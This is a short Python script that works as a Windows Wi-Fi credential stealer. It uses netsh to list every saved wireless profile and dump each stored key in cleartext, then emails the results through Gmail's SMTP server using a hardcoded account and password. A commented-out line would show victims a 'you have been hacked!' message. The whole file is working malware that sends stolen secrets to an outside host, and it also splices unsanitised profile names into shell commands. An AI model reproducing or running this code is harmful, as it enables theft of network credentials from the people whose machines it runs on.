import subprocess
import smtplib
import re


def send_mail(email, password, message):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        print('[+] Email sent.')
    except:
        print('[-] Error sending email.')


# command = 'msg * you have been hacked!'
# subprocess.Popen(command, shell=True)

result = ''
command = 'netsh wlan show profile'
networks = subprocess.check_output(command, shell=True).decode('utf-8')
network_names_list = re.findall('(?:Profile\s*:)(.*)', networks)
for network_name in network_names_list:
    command = 'netsh wlan show profile ' + network_name + ' key=clear'
    current_result = subprocess.check_output(
        command, shell=True).decode('utf-8')
    result += current_result

send_mail('kaisersose099@gmail.com', '12345678Aa', result)
